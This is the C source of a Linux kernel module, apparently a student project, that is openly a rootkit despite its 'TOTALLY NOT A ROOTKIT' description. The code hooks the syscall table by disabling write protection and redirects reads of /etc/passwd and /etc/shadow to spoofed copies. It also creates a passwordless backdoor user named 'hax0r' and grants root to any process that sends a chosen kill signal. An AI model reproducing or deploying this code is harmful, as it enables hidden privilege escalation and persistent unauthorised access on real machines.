#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/file.h>
#include <linux/kmod.h>
#include <linux/umh.h>
#include <linux/fs.h>

#define CR0_WRITE_UNLOCK(x)                       \
    do                                            \
    {                                             \
        unsigned long __cr0;                      \
        preempt_disable();                        \
        __cr0 = read_cr0() & (~X86_CR0_WP);       \
        BUG_ON(unlikely((__cr0 & X86_CR0_WP)));   \
        write_cr0(__cr0);                         \
        x;                                        \
        __cr0 = read_cr0() | X86_CR0_WP;          \
        BUG_ON(unlikely(!(__cr0 && X86_CR0_WP))); \
        write_cr0(__cr0);                         \
        preempt_enable();                         \
    } while (0)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Khan, Kleiman, Gao, Son");
MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");

static unsigned long *sys_call_table; //points to kernel's syscall table
static typeof(sys_read) *actual_open;
static unsigned int *module_init_complete;
volatile unsigned int vol_disable_h;

/**
 * So that we can return a pathname and its kernel page from 1 function.
 */
typedef struct PathData
{
    char *path_name;
    char *tmp_loc;
} PathData;

//max numTargets
#define numTargets 5
//MAKE CHANGES TO THE BELOW ARRAYS IN THE loadMod() function
static int syscall_names[numTargets];             //array defining syscall name (macro index) for each target
static void *original_syscallPtrs[numTargets];    //array to store ptrs to the original kernel syscall functions
static void *totallyReal_syscallPtrs[numTargets]; //array to store ptrs to our fake syscall functions
static bool toInject[numTargets] = {0};           //array to toggle which targets to intercept (default all 0 unless changed in loadMod)

asmlinkage long totallyReal_read(int fd, char __user *buf, size_t count)
{
    pr_info("Intercepted read of fd=%d, %lu byes\n", fd, count);
    return ((typeof(sys_read) *)(original_syscallPtrs[0]))(fd, buf, count);
    //note how above the saved original ptr has to be casted back to typeof(sys_read) before being called.
}

asmlinkage long totallyReal_openfat(int dirfd, const char *pathname, int flags, mode_t mode)
{
    if (strstr(pathname, "/etc/passwd") != NULL) {
	pr_info("openAt called (open) path:%s,,fd:%d\n", pathname, dirfd);
	copy_to_user((void *)pathname, "/etc/secretpasswd", strlen("/etc/secretpasswd") + 1);
        return ((typeof(sys_openat) *)(original_syscallPtrs[1]))(dirfd, pathname, flags, mode);
    } else if (strstr(pathname, "/etc/shadow") != NULL) {
	pr_info("/etc/shadow opened\n");
	copy_to_user((void *)pathname, "/etc/secretshadow", strlen("/etc/secretshadow") + 1);
        return ((typeof(sys_openat) *)(original_syscallPtrs[1]))(dirfd, pathname, flags, mode);
    }

    return ((typeof(sys_openat) *)(original_syscallPtrs[1]))(dirfd, pathname, flags, mode);
}

asmlinkage int totallyReal_mkdir(const char *pathname, mode_t mode)
{
    pr_info("fakeMkdir called with pathname:%s\n", pathname);
    return ((typeof(sys_mkdir) *)(original_syscallPtrs[2]))(pathname, mode);
}

//privilege escalation code
int secretEscalationSig = 42;
module_param(secretEscalationSig, int, 0);
MODULE_PARM_DESC(secretEscalationSig, "define a kill signal which when used will elevate the uid of the caller to 0 (root)\n");

void escalateProcess(pid_t pid)
{
    pr_info("escalation called for pid %d\n", pid);

    struct task_struct *currentTask = get_current();
    pr_info("current task struct has pid %d\n", currentTask->pid);

    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);

    struct cred *elevatedCred = prepare_creds();
    if (elevatedCred == NULL)
    {
        pr_info("ERROR: prepare_creds() returned NULL\n");
        return; // -ENOMEM;
    }
    elevatedCred->uid = kuid;
    elevatedCred->gid = kgid;
    elevatedCred->euid = kuid;
    elevatedCred->egid = kgid;

    pr_info("committing result %d\n", commit_creds(elevatedCred));

    return;
}

asmlinkage int totallyReal_kill(pid_t pid, int sig)
{
    pr_info("kill issued on pid %d with sig %d\n", pid, sig);
    if (sig == secretEscalationSig)
    {
        pr_info("secretEscalationSig used");
        escalateProcess(pid);
        return 0;
    }
    return ((typeof(sys_kill) *)(original_syscallPtrs[4]))(pid, sig);
}
//end privilege escalation code

void injectSyscalls(void)
{
    int targetIndex;
    for (targetIndex = 0; targetIndex < numTargets; targetIndex++)
    {
        if (toInject[targetIndex])
        {
            pr_info("Starting injection for target %d\n", targetIndex);

            //save original ptr
            original_syscallPtrs[targetIndex] = (void *)sys_call_table[syscall_names[targetIndex]];
            pr_info("original ptr stored as %p\n", original_syscallPtrs[targetIndex]);

            //inject fake ptr
            CR0_WRITE_UNLOCK({
                sys_call_table[syscall_names[targetIndex]] = totallyReal_syscallPtrs[targetIndex];
            });
            pr_info("phony ptr injected as %p\n", (void *)sys_call_table[syscall_names[targetIndex]]);

            pr_info("Injection complete for target %d\n", targetIndex);
        }
        else
        {
            pr_info("skipping injection for target %d\n", targetIndex);
        }
    }
}

void restoreSyscalls(void)
{
    int targetIndex;
    for (targetIndex = 0; targetIndex < numTargets; targetIndex++)
    {
        if (toInject[targetIndex])
        {
            pr_info("Restoring ptr for target %d\n", targetIndex);
            CR0_WRITE_UNLOCK({
                sys_call_table[syscall_names[targetIndex]] = original_syscallPtrs[targetIndex];
            });
            pr_info("Ptr restored for target %d as %p\n", targetIndex, (void *)sys_call_table[syscall_names[targetIndex]]);
        }
        else
        {
            pr_info("Skipping restoration for target %d\n", targetIndex);
        }
    }
}

/**
 * Create old (fake) passwd & shadow file
 * Basically, a copy of the /etc/passwd file and /etc/shadow file before we add our secret user
 */
void create_fake_files(void)
{
    char *envp[] = {"HOME=/", NULL};

    // NOTE: probably want to hide these files with the "ls" part of the rootkit
    char *argv1[] = {"/bin/cp", "/etc/passwd", "/etc/secretpasswd", NULL};
    char *argv2[] = {"/bin/cp", "/etc/shadow", "/etc/secretshadow", NULL};

    printk(KERN_INFO "attempting to duplicate/create fake files\n");

    if (call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC) < 0)
    {
        printk(KERN_INFO "unable to copy passwd\n");
    }

    if (call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC) < 0)
    {
        printk(KERN_INFO "unable to copy shadow\n");
    }
}

/**
 * Create the backdoor user, which would be hidden while module is loaded
 */
void create_backdoor_user(void)
{
    char *envp[] = {"HOME=/", NULL};

    // add "-p" followed by a hashed password to specify a password.
    // currently, anyone can login to the account without a password.
    // char *argv[] = { "/usr/sbin/useradd", "-u", "33333", "-g", "haxor", "-d", "/home/haxor", "-s", "/bin/bash", "haxor", NULL };
    char *argv[] = {"/usr/sbin/useradd", "hax0r", NULL};

    printk(KERN_INFO "attempting to create hacker user\n");

    if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC) < 0)
    {
        printk(KERN_INFO "unable to create backdoor user\n");
    }

    return;
}

/**
 * Removes the backdoor user
 */
void remove_backdoor_user(void)
{
    vol_disable_h = 1;

    char *envp[] = {"HOME=/", NULL};
    char *argv[] = {"/usr/sbin/deluser", "hax0r", NULL};

    printk(KERN_INFO "attempting to remove hacker user\n");

    if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC) < 0)
    {
        printk(KERN_INFO "unable to remove backdoor user\n");
    }

    vol_disable_h = 0;

    return;
}

/**
 * Get the full path from a given fd
 */
void set_path_from_fd(int fd, PathData *data)
{
    // parse the file path from the current fd
    char *tmp_loc;
    char *path_name;
    struct file *tmp_file;
    struct path *tmp_path;

    tmp_file = fget(fd);
    if (!tmp_file)
    {
        printk(KERN_INFO "unable to get file struct ptr from fd\n");

        // set path_name to nothing - so as to tell callee that it failed
        data->tmp_loc = NULL;

        return;
    }

    tmp_path = &tmp_file->f_path;
    path_get(tmp_path);

    // get a free mem page to store the path in
    tmp_loc = (char *)__get_free_page(GFP_KERNEL);
    if (!tmp_loc)
    {
        printk(KERN_INFO "unable to get free page of kernel memory for buffering path_name\n");

        // put to buff
        path_put(tmp_path);

        // set path_name to nothing - so as to tell callee that it failed
        data->tmp_loc = NULL;

        // free the page here, b/c callee function only free's if this function was successful
        free_page((unsigned long)tmp_loc);

        return;
    }

    path_name = d_path(tmp_path, tmp_loc, PAGE_SIZE);
    path_put(tmp_path);

    // reached error with the pathname
    if (IS_ERR(path_name))
    {
        printk(KERN_INFO "error pathname return\n");

        // set path_name to nothing - so as to tell callee that it failed
        data->tmp_loc = NULL;

        // free the page here, b/c callee function only free's if this function was successful
        free_page((unsigned long)tmp_loc);

        return;
    }

    // printk(KERN_INFO "valid pathname return\n");
    // reached - hence a valid file/path was parsed from a fd.
    data->path_name = path_name;
    data->tmp_loc = tmp_loc;

    return;
}

/**
 * Spoof reader event handler
 */
static asmlinkage long hooked_spoof_read(int fd, char __user *buf, size_t size)
{
    // check whether init has completed.
    // if it hasn't - then operate as normal
    if (module_init_complete != 1)
    {
        printk(KERN_INFO "init not complete yet");

        return actual_open(fd, buf, size);
    }

    // set the pathname from the fd
    PathData data_ptr;
    data_ptr.tmp_loc = NULL; // preset this to null just-incase...
    set_path_from_fd(fd, &data_ptr);

    // reaches block if there was an error reading the filepath from the fd
    if (data_ptr.tmp_loc == NULL)
    {
        printk(KERN_INFO "null tmp_loc so return real file");

        return actual_open(fd, buf, size);
    }

    // got a file_path - determine if it's what we want.
    // determine whether pathname is a file we spoofed
    if (strcmp(data_ptr.path_name, "/etc/passwd") == 0)
    {
        // cleanup allocated kernel page
        if (data_ptr.tmp_loc != NULL)
        {
            free_page((unsigned long)data_ptr.tmp_loc);
        }

        // if hack is disabled - volatile so right before we do it.
        if (vol_disable_h == 1)
        {
            return actual_open(fd, buf, size);
        }

        printk(KERN_INFO "reading passwd file\n");

        // remove the hacked user (aka hide it)
        // this volatile function returns immediately but actually only gets executed 1s later.
        // thus the user should recieve read of the file that doesn't have the hacker yet.
        remove_backdoor_user();
        // volatile_create_backdoor_user();

        return actual_open(fd, buf, size);
    }
    else if (strcmp(data_ptr.path_name, "/etc/shadow") == 0)
    {
        // cleanup allocated kernel page
        if (data_ptr.tmp_loc != NULL)
        {
            free_page((unsigned long)data_ptr.tmp_loc);
        }

        // if hack is disabled - volatile so right before we do it.
        if (vol_disable_h == 1)
        {
            return actual_open(fd, buf, size);
        }

        printk(KERN_INFO "reading shadow file\n");

        // remove the hacked user (aka hide it)
        // this volatile function returns immediately but actually only gets executed 1s later.
        // thus the user should recieve read of the file that doesn't have the hacker yet.
        remove_backdoor_user();
        // volatile_create_backdoor_user();

        return actual_open(2, buf, size);
    }

    // cleanup allocated kernel page
    free_page((unsigned long)data_ptr.tmp_loc);

    return actual_open(fd, buf, size);
}

int __init loadMod(void)
{
    vol_disable_h = 1;

    create_fake_files();
    create_backdoor_user();
    
    //get and store sys_call_table ptr
    sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
    if (sys_call_table == NULL)
    {
        pr_info("sys_call_table not found using kallsyms\n");
        return -1;
    }

    pr_info("module loaded\n");
    pr_info("sys_call_table pointer is %p\n", sys_call_table);

    //FOR EACH NEW SYS CALL you must...
    //increment numTargets, thus obtaining a free index. Then using said index:
    syscall_names[0] = __NR_read;                           //store the syscall name (is macro for index in sys_call_table)
    totallyReal_syscallPtrs[0] = (void *)&totallyReal_read; //store the ptr to your fake function
    toInject[0] = 0;                                        //set whether or not you want to inject your fake function.

    syscall_names[1] = __NR_openat;
    totallyReal_syscallPtrs[1] = (void *)&totallyReal_openfat;
    toInject[1] = 1;

    syscall_names[2] = __NR_mkdir;
    totallyReal_syscallPtrs[2] = (void *)&totallyReal_mkdir;
    toInject[2] = 1;

    toInject[3] = 0; //getDents intercept is using targetIndex 3 in other branch

    syscall_names[4] = __NR_kill;
    totallyReal_syscallPtrs[4] = (void *)&totallyReal_kill;
    toInject[4] = 1;

    // allow writing on x86
  //  CR0_WRITE_UNLOCK({
   //     actual_open = (typeof(sys_read) *)sys_call_table[__NR_read];
   //     sys_call_table[__NR_read] = (void *)&hooked_spoof_read;
    //});

    injectSyscalls();

    module_init_complete = 1;
    vol_disable_h = 0;

    return 0;
}

void __exit unloadMod(void)
{
    pr_info("notarootkit unloading\n");

    // remove the backdoor account from the /etc/passwd & shadow file
    //remove_backdoor_user();

    restoreSyscalls();

    pr_info("notarootkit unloaded\n");
    return;
}

module_init(loadMod);
module_exit(unloadMod);
